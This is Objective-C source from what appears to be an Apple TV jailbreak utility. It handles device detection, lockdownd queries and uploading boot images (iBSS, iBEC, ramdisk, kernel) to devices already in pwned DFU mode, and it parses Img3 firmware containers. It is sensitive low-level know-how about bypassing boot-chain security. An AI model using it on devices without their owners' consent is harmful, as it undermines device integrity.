    if(view.ignoreDisconnect == YES) return;
    
    NSMutableArray *AppleTVs = view.AppleTVs;
    
    AppleTVIcon *match = nil;
    
    for(AppleTVIcon *icon in AppleTVs) {
        if(ecid != -1) {
            if(icon.ecid == ecid) {
                match = icon;
                break;
            }
        }
        if(icon.udid != nil) {
            if([icon.udid isEqual:udid]) {
                match = icon;
                break;
            }
        }
    }
    
    if(match) {
        match.hidden = YES;
        match.connected = 0;
        arrangeIcons();
    }
}

void arrangeIcons() {
    
    MainView *view = [Blackb0x ATVKit].mainView;
    if(view.ignoreDisconnect == YES) return;
    
    NSMutableArray *AppleTVs = view.AppleTVs;
    NSMutableArray *connectedDevices = [[NSMutableArray alloc] init];
    
    AppleTVIcon *icon;
    
    for(icon in AppleTVs) {
        if(icon.connected == 1) {
            [connectedDevices addObject:icon];
        }
    }
    

    view.searchIndicator.hidden = YES;
    [view updateSelectField:@"Select an Apple TV"];

    view.jb_button.enabled = YES;
    
    switch([connectedDevices count]) {
        case 0 :
            [view updateSelectField:@"Please connect an Apple TV"];
            view.searchIndicator.hidden = NO;
            break;
        case 1 :
            icon = [connectedDevices objectAtIndex:0];
            icon.frame = NSMakeRect(view.frame.size.width / 2 - icon.frame.size.width / 2, view.frame.size.height * 0.75 - icon.frame.size.height / 2, icon.frame.size.width, icon.frame.size.height);
            break;
        case 2 :
            icon = [connectedDevices objectAtIndex:0];
            icon.frame = NSMakeRect(view.frame.size.width / 3 - icon.frame.size.width / 2, view.frame.size.height * 0.75 - icon.frame.size.height / 2, icon.frame.size.width, icon.frame.size.height);
            
            icon = [connectedDevices objectAtIndex:1];
            icon.frame = NSMakeRect(view.frame.size.width / 1.5 - icon.frame.size.width / 2, view.frame.size.height * 0.75 - icon.frame.size.height / 2, icon.frame.size.width, icon.frame.size.height);
            break;
        default :
        {
            int segment_size = view.frame.size.width  / ([connectedDevices count] + 1);
            int counter = 1;
            for(icon in connectedDevices) {
                icon.frame = NSMakeRect(segment_size * counter - icon.frame.size.width / 2, view.frame.size.height * 0.75 - icon.frame.size.height / 2, icon.frame.size.width, icon.frame.size.height);
                counter++;
            }
        }
            break;
    }
}

- (void) arrangeIcons {
    arrangeIcons();
}

#pragma mark MobileDevice

#define TOOL_NAME "ideviceinfo"

#define FORMAT_KEY_VALUE 1
#define FORMAT_XML 2

+ (NSDictionary *) plistForDeviceUUID:(char *) str_uuid {
    lockdownd_client_t client = NULL;
    lockdownd_error_t ldret = LOCKDOWN_E_UNKNOWN_ERROR;
    idevice_t device = NULL;
    idevice_error_t ret = IDEVICE_E_UNKNOWN_ERROR;

    const char* udid = str_uuid;
    int use_network = 0;
    const char *domain = NULL;
    const char *key = NULL;

    plist_t node = NULL;
    
    NSDictionary *dict;

    ret = idevice_new_with_options(&device, udid, (use_network) ? IDEVICE_LOOKUP_NETWORK : IDEVICE_LOOKUP_USBMUX);
    if (ret != IDEVICE_E_SUCCESS) {
        if (udid)
            printf("ERROR: Device %s not found!\n", udid);
        else
            printf("ERROR: No device found!\n");
        
        return NULL;
    }

    if(LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &client, TOOL_NAME)) {
        
        printf("Couldn't connect to lockdownd, trying again...");
        [NSThread sleepForTimeInterval:0.5f];
        
        if(LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &client, TOOL_NAME)) {
            fprintf(stderr, "ERROR: Could not connect to lockdownd: %s (%d)\n", lockdownd_strerror(ldret), ldret);
            idevice_free(device);
            return NULL;
        }
    }
    
    /* run query and output information */
    if(lockdownd_get_value(client, domain, key, &node) == LOCKDOWN_E_SUCCESS) {
        if (node) {
            dict = [DeviceManager dictionaryFromPlist:node];
            plist_free(node);
            node = NULL;
        }
    }

    lockdownd_client_free(client);
    idevice_free(device);

    return dict;
}

+ (NSMutableDictionary *) dictionaryFromPlist:(plist_t) node {
    
    NSMutableDictionary *dict = [[NSMutableDictionary alloc] init];
    
    /* iterate over key/value pairs */
    plist_dict_iter it = NULL;

    char* key = NULL;
    plist_t subnode = NULL;
    plist_dict_new_iter(node, &it);
    plist_dict_next_item(node, it, &key, &subnode);
    
    while (subnode) {
        
        NSNumber *num;
        uint64_t u = 0;
        NSString *strKey;
        
        if(key != NULL) {
        
            strKey = [NSString stringWithUTF8String:key];
            
            plist_type t = plist_get_node_type(subnode);

            switch (t) {
                case PLIST_UINT :
                    plist_get_uint_val(subnode, &u);
                    num = [NSNumber numberWithUnsignedLongLong:u];
                    dict[strKey] = num;
                    break;
                case PLIST_STRING :
                {
                    char *s = NULL;
                    plist_get_string_val(subnode, &s);
                    NSString *str = [NSString stringWithUTF8String:s];
                    dict[strKey] = str;
                    free(s);
                }
                    break;
                case PLIST_DICT :
                {
                    NSDictionary *nestedDict = [self dictionaryFromPlist:subnode];
                    dict[strKey] = nestedDict;
                }
                    break;
                case PLIST_BOOLEAN :
                {
                    uint8_t b;
                    plist_get_bool_val(node, &b);
                    dict[strKey] = [NSNumber numberWithUnsignedChar:b];
                }
                    break;
                case PLIST_DATE :
                {
                    struct timeval tv = { 0, 0 };
                    plist_get_date_val(node, (int32_t*)&tv.tv_sec, (int32_t*)&tv.tv_usec);
                    NSDate *date = [NSDate dateWithTimeIntervalSince1970:(time_t)tv.tv_sec];
                    dict[strKey] = date;
                }
                    break;

                case PLIST_DATA :
                {
                    char *bytes = NULL;
                    plist_get_data_val(node, &bytes, &u);
                    NSData *data = [NSData dataWithBytes:bytes length:u];
                    dict[strKey] = data;
                }
                    break;
                case PLIST_ARRAY :
                    break;
                case PLIST_REAL :
                {
                    double d;
                    plist_get_real_val(node, &d);
                    num = [NSNumber numberWithDouble:d];
                    dict[strKey] = num;
                }
                    break;
                default :
                    break;
            }
            
            free(key);
            key = NULL;
        
        }
        plist_dict_next_item(node, it, &key, &subnode);
    }
    free(it);
    
    return dict;
}

/*    typedef enum
{
    PLIST_BOOLEAN,   < Boolean, scalar type
    PLIST_UINT,    < Unsigned integer, scalar type
    PLIST_REAL,    < Real, scalar type
    PLIST_STRING,    < ASCII string, scalar type
    PLIST_ARRAY,    < Ordered array, structured type
    PLIST_DICT,    < Unordered dictionary (key/value pair), structured type
    PLIST_DATE,    < Date, scalar type
    PLIST_DATA,    < Binary data, scalar type
    PLIST_KEY,    < Key in dictionaries (ASCII String), scalar type
    PLIST_UID,      < Special type used for 'keyed encoding'
    PLIST_NONE    < No type
} plist_type;
*/

#pragma mark - iRecovery (iBSS, iBEC, Ramdisk, Kernel)

- (int) sendiBSS:(NSString *) iBSSpath ecid:(uint64_t) ecid {
    return sendiBSS((char *)[iBSSpath UTF8String], ecid);
}

int sendiBSS(char *iBSSpath, uint64_t ecid) {
    printf("trying to send ibss\n");
    
    uploadClient = get_tv(ecid);
    
    if(!uploadClient) printf("no upload client m8\n");
    
    irecv_client_t client = uploadClient;
    irecv_device_t device = NULL;
    
    irecv_devices_get_device_by_client(client, &device);
    printf("Connected to %s, model %s, cpid 0x%04x, bdid 0x%02x\n", device->product_type, device->hardware_model, device->chip_id, device->board_id);

    dispatch_async(dispatch_get_main_queue(), ^{
        [Blackb0x ATVKit].mainView.select_device.stringValue = @"Sending iBSS...";
    });
    
    if(strstr(device->product_type, "AppleTV3,1")) {
        irecv_close(client);
        return sendiBSS_ATV31(ecid, iBSSpath);
    }
    
    if(strstr(device->product_type, "AppleTV3,2")) {
        irecv_close(client);
        return sendiBSS_ATV32(ecid, iBSSpath);
    }
    
    //AppleTV2,1
    irecv_error_t err = irecv_send_file(client, iBSSpath, 1);
    if(err != IRECV_E_SUCCESS) {
        printf("Failed to send iBSS file: %s\n", irecv_strerror(err));
        return -1;
    }
    
    irecv_close(client);
    return 0;
}

- (int) sendiBEC:(NSString *) iBECpath ecid:(uint64_t) ecid {
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [Blackb0x ATVKit].mainView.select_device.stringValue = @"Sending iBEC...";
    });
    
    return sendiBEC((char *)[iBECpath UTF8String], ecid);
}

int sendiBEC(char *iBECpath, uint64_t ecid) {
    
    uploadClient = get_tv(ecid);
    irecv_client_t client = uploadClient;

    irecv_error_t errors = irecv_send_file(client, iBECpath, 1);
    printf("%s\n", irecv_strerror(errors));
    irecv_close(client);
    sleep(2);
    return 0;
}

- (int) sendRamdisk:(NSString *) Ramdisk_Path ecid:(uint64_t) ecid {
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [Blackb0x ATVKit].mainView.select_device.stringValue = @"Sending Ramdisk...";
    });
    
    return sendRamdisk((char *)[Ramdisk_Path UTF8String], ecid);
}

int sendRamdisk(char *Ramdisk_Path, uint64_t ecid) {
    
    uploadClient = get_tv(ecid);
    irecv_client_t client = uploadClient;
    
    irecv_error_t errors = irecv_send_file(client, Ramdisk_Path, 1);
    
    errors = irecv_send_command(client, "ramdisk");
    //printf("%s\n", irecv_strerror(errors));
    
    irecv_close(client);
    sleep(2);
    return 0;
}

- (int) sendKernelCache:(NSString *) KernelCache_Path ecid:(uint64_t) ecid {
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [Blackb0x ATVKit].mainView.select_device.stringValue = @"Sending Kernel...";
    });
    
    return sendKernelCache((char *)[KernelCache_Path UTF8String], ecid);
}

int sendKernelCache(char *KernelCache_Path, uint64_t ecid) {
    
    uploadClient = get_tv(ecid);
    irecv_client_t client = uploadClient;

    irecv_error_t errors = irecv_send_file(client, KernelCache_Path, 1);
    //printf("%s\n", irecv_strerror(errors));
    
    errors = irecv_send_command(client, "bootx");
    irecv_close(client);
    sleep(2);
    return 0;
}

- (int) sendDeviceTree:(NSString *) DeviceTree_Path ecid:(uint64_t) ecid {
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [Blackb0x ATVKit].mainView.select_device.stringValue = @"Sending DeviceTree...";
    });
    
    return sendDeviceTree((char *)[DeviceTree_Path UTF8String], ecid);
}

int sendDeviceTree(char *DeviceTree_Path, uint64_t ecid) {
    
    uploadClient = get_tv(ecid);
    irecv_client_t client = uploadClient;

    irecv_error_t errors = irecv_send_file(client, DeviceTree_Path, 1);
    //printf("%s\n", irecv_strerror(errors));
    errors = irecv_send_command(client, "devicetree");
    //printf("%s\n", irecv_strerror(errors));

    irecv_close(client);
    sleep(2);
    return 0;
}

static void print_hex(unsigned char *buf, size_t len)
{
    size_t i;
    for (i = 0; i < len; i++) {
        printf("%02x", buf[i]);
    }
}

#pragma mark - AppleTV3,2 Booting

int sendiBSS_ATV32(uint64_t ecid, char *path) {
    
    printf("sendiBSS_ATV32(%s, %llu)\n", path, ecid);
    
    irecv_client_t client = get_tv(ecid);
        
    if(!client) {
        printf("Failed to get device.\n");
        return -1;
    }
     
    int handle = open(path, 0);
    
    if(handle < 0) {
        printf("Failed to open iBSS\n");
        return -1;
    }
    
    size_t buffer_size = lseek(handle, 0, 2);
    if(buffer_size == 0) {
        printf("ERROR: iBSS is empty\n");
        return -1;
    }
    
    unsigned char *buffer = malloc(buffer_size);
    
    if(buffer == 0x0) {
        printf("ERROR: out of memory\n");
        return -1;
    }
    
    if(pread(handle, buffer, buffer_size, 0) < 0) {
        printf("ERROR: failed to read input file\n");
        return -1;
    }
    
    int ret = dfu_boot(client, (const char*)buffer, buffer_size, 0);
    
    if(ret == 0) {
        printf("Booted iBSS\n");
        
        printf("handle %i\n", handle);
        printf("seek %zu\n", buffer_size);
        
        //for(int i = 0; i < seek; i++) {
            //printf("%c", buffer[i]);
        //}

        return 0;
    }
    
    printf("Failed to boot iBSS\n");
    return 1;
}

#pragma mark - AppleTV3,1 Booting

int sendiBSS_ATV31(uint64_t ecid, char *iBSSpath) {
    
    irecv_client_t client = get_tv(ecid);
    if(!client) return -1;
    
    irecv_device_t device = NULL;
    irecv_devices_get_device_by_client(client, &device);

    int ret;
    size_t length;
    FILE* iBSSfile;
    void* buf;
    iBSSfile = fopen(iBSSpath, "rb");
    if(!iBSSfile) {
        printf("Unable to open iBSS %s \n", iBSSpath);
        return -1;
    }
    
    printf("Sending iBSS from %s \n", iBSSpath);
    printf("To device %s\n", device->product_type);
    
    fseek(iBSSfile, 0, SEEK_END);
    length = ftell(iBSSfile);
    fseek(iBSSfile, 0, SEEK_SET);
    
    buf = (void*)malloc(length);
    fread(buf, 1, length, iBSSfile);
    fclose(iBSSfile);
    ret = boot_client(client, buf, length);
    if (ret != 0) {
        return -1;
    }
    sleep(2);
    return 0;
}

void send_progress(double progress) {
    printf("progress %f", progress);
    if(progress < 0) {
        return;
    }
    if(progress > 100) {
        progress = 100;
    }
}


//** Thank You @dora2 for this below! **//

#define AES_DECRYPT_IOS 0x11
#define AES_GID_KEY     0x20000200
#define IMG3_HEADER     0x496d6733
#define ARMv7_VECTOR    0xEA00000E
#define IMG3_ILLB       0x696c6c62
#define IMG3_IBSS       0x69627373
#define IMG3_DATA       0x44415441
#define IMG3_KBAG       0x4B424147
#define EXEC            0x65786563
#define MEMC            0x6D656D63

int check_img3_file_format(irecv_client_t client, void* file, size_t sz, void** out, size_t* outsz);
int send_data(irecv_client_t client, unsigned char* data, size_t size);

typedef struct img3Tag {
    uint32_t magic;            // see below
    uint32_t totalLength;      // length of tag including "magic" and these two length values
    uint32_t dataLength;       // length of tag data
    // ...
} Img3RootHeader;

typedef struct Unparsed_KBAG_256 {
    uint32_t magic;       // string with bytes flipped ("KBAG" in little endian)
    uint32_t fullSize;    // size of KBAG from beyond that point to the end of it
    uint32_t tagDataSize; // size of KBAG without this 0xC header
    uint32_t cryptState;  // 1 if the key and IV in the KBAG are encrypted with the GID Key
    // 2 is used with a second KBAG for the S5L8920, use is unknown.
    uint32_t aesType;     // 0x80 = aes128 / 0xc0 = aes192 / 0x100 = aes256
    uint8_t encIV_start;    // IV for the firmware file, encrypted with the GID Key
    // ...   // Key for the firmware file, encrypted with the GID Key
} UnparsedKbagAes256_t;

typedef struct img3File {
    uint32_t magic;       // ASCII_LE("Img3")
    uint32_t fullSize;    // full size of fw image
    uint32_t sizeNoPack;  // size of fw image without header
    uint32_t sigCheckArea;// although that is just my name for it, this is the
    // size of the start of the data section (the code) up to
    // the start of the RSA signature (SHSH section)
    uint32_t ident;       // identifier of image, used when bootrom is parsing images
    // list to find LLB (illb), LLB parsing it to find iBoot (ibot),
    // etc.
    struct img3Tag  tags[];      // continues until end of file
} Img3Header;

int send_data(irecv_client_t client, unsigned char* data, size_t size){
    return irecv_usb_control_transfer(client, 0x21, 1, 0, 0, data, size, 100);
}

int boot_client(irecv_client_t client, void* buf, size_t sz) {
    
    int ret;
    if(!client) {
        printf("No device found.");
        return -1;
    }
    
    const struct irecv_device_info* info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        irecv_close(client);
        printf("Device not in pwned DFU mode.\n");
        return -1;
    }
    
    void* ibss;
    size_t ibss_sz;
    unsigned char blank[16];
    bzero(blank, 16);
    
    ret = check_img3_file_format(client, buf, sz, &ibss, &ibss_sz);
    
    if (ret != 0){
        printf("Failed to make soft DFU.\n");
        irecv_close(client);
        return -1;
    }
    send_data(client, blank, 16);
    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
    
    printf("\x1b[36mUploading soft DFU\x1b[39m\n");
    size_t len = 0;
    while(len < ibss_sz) {
        size_t size = ((ibss_sz - len) > 0x800) ? 0x800 : (ibss_sz - len);
        size_t sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&ibss[len], size, 1000);
        if(sent != size) {
            printf("Failed to upload iBSS.\n");
            return -1;
        }
        len += size;
        double converted_len = (double)len;
        double converted_ibss_size = (double)ibss_sz;
        double s_prog = (double)converted_len/converted_ibss_size;
        send_progress((double)s_prog*100);
    }
    
    irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, buf, 0, 100);
    
    irecv_close(client);
    return 0;
}

int check_img3_file_format(irecv_client_t client, void* file, size_t sz, void** out, size_t* outsz){
    uint32_t Img3header_magic = *(uint32_t*)(file + offsetof(struct img3File, magic));
    switch(Img3header_magic) {
        case ARMv7_VECTOR:
            // Do nothing
            printf("\x1b[36mDecrypted Img3 image\x1b[39m\n");
            *out = malloc(sz);
            *outsz = sz;
            memcpy(*out, file, *outsz);
            return 0;
            break;
            
        case IMG3_HEADER:
            printf("\x1b[36mPacked Img3 image\x1b[39m\n");
            uint32_t ibss_data_start = 0;
            uint32_t tag_header = 0;
            int isKBAG = 0;
            uint8_t IV[16];
            uint8_t Key[32];
            
            uint32_t img3_ident = *(uint32_t*)(file + offsetof(struct img3File, ident));
            //printf("Ident : 0x%08x\n", img3_ident);
            if (img3_ident == IMG3_ILLB || img3_ident == IMG3_IBSS){
                printf("\x1b[35mDetect iBSS/LLB image\x1b[39m\n");
            } else {
                printf("Invalid image\n");
                return -1;
            }
            
            uint32_t img3_fullSize = *(uint32_t*)(file + offsetof(struct img3File, fullSize));
            uint32_t img3_sizeNoPack = *(uint32_t*)(file + offsetof(struct img3File, sizeNoPack));
            
            uint32_t next = img3_fullSize - img3_sizeNoPack; //0x14
            
            for(uint32_t next_tag = next; next_tag < img3_fullSize;){
                uint32_t img3_tag_magic = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, magic));
                //printf("tag magic: 0x%08x\n", img3_tag_magic);
                uint32_t img3_tag_totalLength = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, totalLength));
                //printf("tag totalLength: 0x%08x\n", img3_tag_totalLength);
                uint32_t img3_tag_dataLength = *(uint32_t*)(file + next_tag + offsetof(struct img3Tag, dataLength));
                //printf("tag dataLength: 0x%08x\n", img3_tag_dataLength);
                
                if(img3_tag_magic == IMG3_DATA) {
                    tag_header = img3_tag_magic;
                    *outsz = img3_tag_dataLength;
                    ibss_data_start = next_tag + offsetof(struct img3Tag, dataLength) + 4;
                }
                
                if(img3_tag_magic == IMG3_KBAG) {
                    if(*(uint32_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, cryptState)) == 1){
                        isKBAG = 1;
                        //uint32_t tagDataSize = *(uint32_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, tagDataSize));
                        //printf("tagDataSize: 0x%08x\n", tagDataSize);
                        for(int i = 0; i < 16; i++){
                            IV[i] = *(uint8_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, encIV_start)+i);
                        }
                        for(int i = 0; i < 32; i++){
                            Key[i] = *(uint8_t*)(file + next_tag + offsetof(struct Unparsed_KBAG_256, encIV_start)+16+i);
                        }
                    }
                }
                
                next_tag += img3_tag_totalLength;
            }
            
            if(tag_header != IMG3_DATA) {
                printf("Invalid image\n");
                return -1;
            }
            
            *out = malloc(*outsz);
            memcpy(*out, file+ibss_data_start, *outsz);
            
            //uint32_t out_magic = *(uint32_t*)(*out + offsetof(struct img3File, magic));
            //printf("out magic: 0x%08x\n", out_magic);
            return 0;
            break;
            
        default:
            printf("Invalid image\n");
            return -1;
            break;
    }
    
    printf("Invalid image\n");
    return -1;
}

@end
